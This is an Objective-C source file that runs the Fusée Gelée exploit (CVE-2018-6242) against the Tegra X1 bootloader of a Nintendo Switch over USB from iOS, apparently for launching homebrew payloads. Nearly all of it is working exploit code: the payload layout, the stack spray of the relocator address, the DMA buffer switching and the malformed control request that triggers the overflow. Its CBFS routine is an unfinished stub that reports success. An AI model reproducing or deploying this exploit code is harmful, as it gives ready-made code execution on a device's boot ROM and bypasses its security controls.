/**
 * @file exploits a Tegra X1 CPU's bootloader using Fusée Gelée
 * @author Oliver Kuckertz <oliver.kuckertz@mologie.de>
 *
 * This class is a reimplementation of {re}switched's fusee-launcher.py for iOS/IOKit.
 */

#import "FLExec.h"
#import "NSData+FLHexEncoding.h"
#import <IOKit/IOKitLib.h>
#import <IOKit/IOCFPlugIn.h>
#import <IOKit/usb/IOUSBLib.h>

static UInt32 const kNXCopyBuf1        = 0x40009000;
static UInt32 const kNXStackLowest     = 0x40010000;
static UInt32 const kNXPayloadAddr     = kNXStackLowest;
static UInt32 const kNXRelocatorAddr   = 0x40010E40;
static UInt32 const kNXStackSprayStart = 0x40014E40;
static UInt32 const kNXStackSprayEnd   = 0x40017000;

static UInt8 DMADummyBuffer[kNXStackLowest - kNXCopyBuf1]; // 0x7000 / 28 KiB

#define ERR(FMT, ...) FLSetError([NSString stringWithFormat:FMT, ##__VA_ARGS__], err)

struct FLExecDesc {
    FLUSBSubInterface **intf;
    UInt8 readRef, writeRef;
};

static struct FLExecDesc kFLExecDescInvalid = {
    .intf       = NULL,
    .readRef    = 0,
    .writeRef   = 0
};

static void FLPadData(NSMutableData *data, NSUInteger npad) {
    UInt8 zero = 0;
    for (NSUInteger i = 0; i < npad; i++) {
        [data appendBytes:&zero length:1];
    }
}

static void FLSetError(NSString *message, NSString **err) {
    if (err) {
        *err = message;
    }
    NSLog(@"ERR: %@", message);
}

static NSData *FLExecReadDeviceID(struct FLExecDesc const *desc) {
    kern_return_t kr;
    UInt8 deviceID[16];
    UInt32 btransf = sizeof(deviceID);
    kr = FLCOMCall(desc->intf, ReadPipeTO, desc->readRef, deviceID, &btransf, 1000, 1000);
    if (kr) {
        NSLog(@"ERR: Failed to read device ID via ReadPipeTO with code %08x", kr);
        return nil;
    }
    if (btransf != sizeof(deviceID)) {
        NSLog(@"ERR: Incomplete read for device ID");
        return nil;
    }
    return [NSData dataWithBytes:deviceID length:sizeof(deviceID)];
}

static BOOL FLExecFuseeGelee(FLUSBDevice *device, struct FLExecDesc const *desc, NSData *relocator, NSData *iramImage, NSString **err) {
    // There are two implementations for CVE-2018-6242: Fusée Gelée and ShofEL2.
    //
    // Fusée Gelée's payload is structured like so:
    // [header][0x40010000: relocator][0x40010E40: payload part 1][0x40014E40: spray address of relocator][0x40017000: payload part 2]
    // The relocator (intermezzio) copies itself to the end of IRAM (0x40039XXX), stitches the payload back together at 0x40010000 and jumps to it.
    // This yields a max. relocator size of approx 3.5 KiB and max payload size of approx. 179 KiB.
    //
    // ShofEL2's payload has a different layout:
    // [header][0x40010000: 0x68E8 bytes padding][address of cbfs][cbfs/payload]
    // The payload, like Fusée's, copies itself to the end of IRAM (usually 0x40048000 for the standard 2 KiB cbfs payload.)
    // It then writes "CBFS\n" to USB EP1 using BootROM code, reads 28 KiB of Coreboot boot block data to 0x40010000 and jumps to it.
    // Coreboot seamlessly continues to read anything following those 28 KiB into DRAM.
    //
    // We only need to reimplement Fusée Gelée with exchangeable relocator and detect CBFS to support all configurations:
    // - Hekate, SX OS etc. want their small (< 100 KiB) payload relocated to 0x40010000
    // - Coreboot's CBFS fits Fusée's relocator size constraint and doesn't care about its initial base address
    // - CBFS can be detected by searching for "CBFS\n" in the relocator or checking for a large (> 200 KiB) payload

    kern_return_t kr;
    UInt32 const packetSize = 0x1000;
    UInt32 const headerLength = 680;
    UInt32 const payloadMaxLength = 0x30298; // approx. 192 KiB

    // read device ID, which is required for proceeding into RCM mode
    NSLog(@"USB: Reading device ID...");
    NSData *deviceID = FLExecReadDeviceID(desc);
    if (!deviceID) {
        ERR(@"Could not read device ID. Try restarting the Switch by holding the POWER button for 12 seconds.");
        return NO;
    }
    NSLog(@"USB: Device ID: %@", deviceID.FL_hexLowerCaseString);

    // sanity check
    if (relocator.length > kNXRelocatorAddr - kNXPayloadAddr) { // 3648 bytes
        ERR(@"Relocator binary exceeds size limit");
        return NO;
    }
    if (iramImage.length > payloadMaxLength - (kNXStackSprayEnd - kNXStackSprayStart) - (kNXRelocatorAddr - kNXPayloadAddr) - headerLength) {
        ERR(@"Boot image binary exceeds size limit");
        return NO;
    }

    // split payload into lower and upper parts
    NSData *iramImage0, *iramImage1;
    NSUInteger iramImage0N = kNXStackSprayStart - kNXRelocatorAddr; // 16 KiB
    if (iramImage.length >= iramImage0N) {
        iramImage0 = [iramImage subdataWithRange:NSMakeRange(0, iramImage0N)];
        iramImage1 = [iramImage subdataWithRange:NSMakeRange(iramImage0N, iramImage.length - iramImage0N)];
    }
    else {
        iramImage0 = iramImage ?: [[NSData alloc] init];
        iramImage1 = [[NSData alloc] init];
    }
    NSLog(@"USB: IRAM image split into chunks: %lu and %lu bytes", (unsigned long)iramImage0.length, (unsigned long)iramImage1.length);

    // construct the Fusée Gelée payload (logic exactly as in fusee-launcher.py)
    NSMutableData *payload = [[NSMutableData alloc] initWithCapacity:payloadMaxLength];
    UInt32 payloadMaxLengthLE = OSSwapHostToLittleInt32(payloadMaxLength);
    [payload appendBytes:(void const *)&payloadMaxLengthLE length:4];
    FLPadData(payload, headerLength - payload.length);
    [payload appendData:relocator];
    FLPadData(payload, kNXRelocatorAddr - (kNXPayloadAddr + relocator.length));
    [payload appendData:iramImage0];
    UInt32 rcmPayloadAddrLE = OSSwapHostToLittleInt32(kNXPayloadAddr);
    for (NSUInteger i = 0; i < (kNXStackSprayEnd - kNXStackSprayStart) / 4; i++) {
        [payload appendBytes:&rcmPayloadAddrLE length:4];
    }
    [payload appendData:iramImage1];
    if (payload.length % packetSize != 0) {
        FLPadData(payload, packetSize - (payload.length % packetSize));
        assert(payload.length % packetSize == 0);
    }
    if (payload.length > payloadMaxLength) {
        ERR(@"Payload final size exceeds limit (this should never happen)");
        return NO;
    }
    NSLog(@"USB: Constructed payload with %lu (0x%lx) bytes", (unsigned long)payload.length, (unsigned long)payload.length);
    //[payload writeToFile:@"/tmp/flexec_payload" atomically:NO];
    //NSLog(@"DBG: Payload dumped at /tmp/flexec_payload");

    // write the payload and track which DMA buffer each packet ends up in
    NSLog(@"USB: Transferring payload...");
    int currentBuffer = 0;
    for (UInt32 i = 0; i < payload.length; i += packetSize) {
        NSLog(@"USB: Progress %lu/%lu", (unsigned long)i, (unsigned long)payload.length);
        kr = FLCOMCall(desc->intf, WritePipeTO, desc->writeRef, (void *)(payload.bytes + i), packetSize, 1000, 1000);
        if (kr) {
            ERR(@"Payload write failed at offset %lu with code %08x", (unsigned long)i, kr);
            return NO;
        }
        currentBuffer = 1 - currentBuffer;
    }

    // the payload size is dynamic; ensure that we end up in the high buffer
    if (currentBuffer != 1) {
        NSLog(@"USB: Switching to high buffer...");
        NSMutableData *zeroes = [[NSMutableData alloc] initWithCapacity:packetSize];
        FLPadData(zeroes, packetSize);
        kr = FLCOMCall(desc->intf, WritePipeTO, desc->writeRef, (void *)zeroes.bytes, packetSize, 1000, 1000);
        if (kr) {
            ERR(@"DMA buffer switch packet write failed with code %08x", kr);
            return NO;
        }
        currentBuffer = 1;
    }
    else {
        NSLog(@"USB: Already in high buffer");
    }

    // NOTE workaround: calling ControlRequest(TO) will crash iOS 11.3.1:
    // panic(cpu 1 caller 0xfffffff018f34260): "complete() while dma active"
    // We issue the control request on the device itself with invalid bmRequestType (endpoint bit is set,) which has
    // the same effect as issuing a control request to an interface.
    NSLog(@"USB: Executing...");
    IOUSBDevRequestTO controlRequest = {
        .bmRequestType     = 0x82, // 0x80 IN | 0x00 STANDARD | 0x02 ENDPOINT
        .bRequest          = kUSBRqGetStatus,
        .wValue            = 0,
        .wIndex            = 0,
        .wLength           = sizeof(DMADummyBuffer),
        .pData             = DMADummyBuffer,
        .wLenDone          = 0,
        .noDataTimeout     = 100,
        .completionTimeout = 100
    };
    kr = FLUSBCall(device, DeviceRequestTO, &controlRequest);
    if (kr) {
        NSLog(@"USB: DeviceRequestTO failed - this is expected (code %08x)", kr);
    }
    else {
        ERR(@"ControlRequestTO should have failed");
        return NO;
    }

    return YES;
}

BOOL FLExecCBFS(struct FLExecDesc const *desc, NSData *cbfsImage, NSString **err) {
    NSLog(@"USB: Waiting for CBFS");

    // TODO read first line and check for CBFS requesting data

    // TODO send the coreboot image

    return YES;
}

static struct FLExecDesc FLExecAcquireDeviceInterface(FLUSBDevice *device, NSString **err) {
    kern_return_t kr;
    struct FLExecDesc desc = kFLExecDescInvalid;
    io_iterator_t subIntfIter = 0;
    io_service_t intfService = 0;

    // open and configure device
    kr = FLUSBCall(device, USBDeviceOpenSeize);
    if (kr) {
        ERR(@"USBDeviceOpenSeize failed with code %08x", kr);
        goto cleanup_error;
    }
    kr = FLUSBCall(device, SetConfiguration, 1);
    if (kr) {
        ERR(@"SetConfiguration failed with code %08x", kr);
        goto cleanup_error;
    }

    // get service of interface zero
    IOUSBFindInterfaceRequest subIntfReq = {
        .bInterfaceClass    = kIOUSBFindInterfaceDontCare,
        .bInterfaceSubClass = kIOUSBFindInterfaceDontCare,
        .bInterfaceProtocol = kIOUSBFindInterfaceDontCare,
        .bAlternateSetting  = kIOUSBFindInterfaceDontCare
    };
    kr = FLUSBCall(device, CreateInterfaceIterator, &subIntfReq, &subIntfIter);
    if (kr) {
        ERR(@"CreateInterfaceIterator failed with code %08x", kr);
        goto cleanup_error;
    }
    while ((intfService = IOIteratorNext(subIntfIter))) {
        NSNumber *intfnum = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(intfService, CFSTR("bInterfaceNumber"), kCFAllocatorDefault, 0);
        if (!intfnum) {
            ERR(@"Could not get bInterfaceNumber for an interface, skipping it");
            continue;
        }
        if (intfnum.integerValue == 0) {
            break;
        }
        IOObjectRelease(intfService);
    }
    IOObjectRelease(subIntfIter);
    subIntfIter = 0;

    // service to service interface boilerplate
    IOCFPlugInInterface **plugInInterface = NULL;
    SInt32 plugInScore;
    kr = IOCreatePlugInInterfaceForService(intfService,
                                           kIOUSBInterfaceUserClientTypeID,
                                           kIOCFPlugInInterfaceID,
                                           &plugInInterface,
                                           &plugInScore);
    if (kr || !plugInInterface) {
        ERR(@"Creating interface plugin failed with code %08x", kr);
        goto cleanup_error;
    }
    kr = (*plugInInterface)->QueryInterface(plugInInterface,
                                            CFUUIDGetUUIDBytes(kFLUSBSubInterfaceUUID),
                                            (void*)&desc.intf);
    FLCOMCall(plugInInterface, Release);
    plugInInterface = NULL;
    if (kr || !desc.intf) {
        ERR(@"QueryInterface for device interface failed wiht code %08x", kr);
        goto cleanup_error;
    }

    // open and configure interface
    kr = FLCOMCall(desc.intf, USBInterfaceOpenSeize);
    if (kr) {
        ERR(@"USBInterfaceOpenSeize failed with code %08x", kr);
        goto cleanup_error;
    }
    kr = FLCOMCall(desc.intf, SetAlternateInterface, 0);
    if (kr) {
        ERR(@"SetAlternateInterface failed with code %08x", kr);
        goto cleanup_error;
    }

    // find endpoint references
    UInt8 nendpoints = 0;
    kr = FLCOMCall(desc.intf, GetNumEndpoints, &nendpoints);
    if (kr || nendpoints == 0) {
        ERR(@"GetNumEndpoints failed with code %08x", kr);
        goto cleanup_error;
    }
    for (UInt8 pipeRef = 1; pipeRef <= nendpoints; pipeRef++) {
        UInt8 direction, number, transferType, interval;
        UInt16 maxPacketSize;
        kr = FLCOMCall(desc.intf, GetPipeProperties, pipeRef, &direction, &number, &transferType, &maxPacketSize, &interval);
        if (kr) {
            ERR(@"GetPipeProperties failed for interface %u with code %08x", pipeRef, kr);
            goto cleanup_error;
        }
        if (desc.readRef == 0 && transferType == kUSBBulk && direction == kUSBIn) {
            desc.readRef = pipeRef;
            continue;
        }
        if (desc.writeRef == 0 && transferType == kUSBBulk && direction == kUSBOut) {
            desc.writeRef = pipeRef;
            continue;
        }
    }
    NSLog(@"USB: Bulk read pipe ID %u, write pipe ID %u", desc.readRef, desc.writeRef);

    return desc;

cleanup_error:
    if (intfService) {
        IOObjectRetain(intfService);
        intfService = 0;
    }
    if (subIntfIter) {
        IOObjectRelease(subIntfIter);
        subIntfIter = 0;
    }
    if (desc.intf) {
        FLCOMCall(desc.intf, USBInterfaceClose);
        FLCOMCall(desc.intf, Release);
    }
    FLUSBCall(device, USBDeviceClose);
    return kFLExecDescInvalid;
}

static void FLExecReleaseDeviceInterface(FLUSBDevice *device, FLUSBSubInterface **intf) {
    FLCOMCall(intf, USBInterfaceClose);
    FLCOMCall(intf, Release);
    FLUSBCall(device, USBDeviceClose);
}

static BOOL FLExecRelocatorIsCBFS(NSData *relocator) {
    // dirty but sufficient: it's unlikely for a non-CBFS first stage to contain the string CBFS and a new-line char
    NSData *tag = [@"CBFS\n" dataUsingEncoding:NSASCIIStringEncoding];
    return [relocator rangeOfData:tag options:0 range:NSMakeRange(0, relocator.length)].location != NSNotFound;
}

BOOL FLExec(FLUSBDevice *device, NSData *relocator, NSData *image, NSString **err) {
    if (!device || !relocator) {
        return NO;
    }
    struct FLExecDesc desc = FLExecAcquireDeviceInterface(device, err);
    BOOL ok = NO;
    if (desc.intf) {
        if (FLExecRelocatorIsCBFS(relocator)) {
            NSLog(@"USB: Treating the relocator as CBFS payload");
            if (FLExecFuseeGelee(device, &desc, relocator, nil, err)) {
                ok = FLExecCBFS(&desc, image, err);
            }
        }
        else {
            ok = FLExecFuseeGelee(device, &desc, relocator, image, err);
        }
        FLExecReleaseDeviceInterface(device, desc.intf);
    }
    return ok;
}

#undef ERR
